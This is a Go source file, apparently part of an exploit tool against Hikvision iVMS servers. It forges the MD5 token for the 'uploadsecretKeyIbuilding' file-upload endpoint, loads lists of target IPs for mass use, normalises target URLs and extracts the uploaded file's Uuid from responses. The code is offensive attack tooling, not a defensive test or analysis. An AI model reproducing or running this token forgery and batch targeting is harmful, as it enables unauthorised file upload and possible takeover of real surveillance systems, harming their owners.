package modules

import (
	"bufio"
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"log"
	"net/url"
	"os"
	"regexp"
	"strings"
)

func (I *Ivms) md5hash() string {
	data := make([]byte, 0)
	if strings.HasSuffix(I.target, "/") {
		data = []byte(I.target + "eps/api/resourceOperations/uploadsecretKeyIbuilding")
	} else {
		data = []byte(I.target + "/eps/api/resourceOperations/uploadsecretKeyIbuilding")
	}
	md5Ctx := md5.New()
	md5Ctx.Write(data)
	cipherStr := md5Ctx.Sum(nil)
	return hex.EncodeToString(cipherStr)
}
func (I *Ivms) loadTargetsFile() {
	file, err := os.OpenFile(I.targetFile, os.O_RDONLY, 0666)
	if err != nil {
		log.Fatal("[*] file error")
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		ip := strings.TrimSpace(scanner.Text())
		if len(ip) == 0 {
			continue
		}
		I.targets = append(I.targets, ip)
	}
}
func (I *Ivms) parseTarget() {
	u, err := url.Parse(I.target)
	if err != nil {
		log.Printf("[*] url %s error.", I.target)
	}
	I.target = fmt.Sprintf("%s://%s", u.Scheme, u.Host)
}
func (I Ivms) getUuid(resp []byte) string {
	regx, _ := regexp.Compile(`Uuid":".*?"`)
	result := regx.FindString(string(resp))
	if result != "" {
		return strings.Split(result, "\"")[2]
	}
	return ""
}
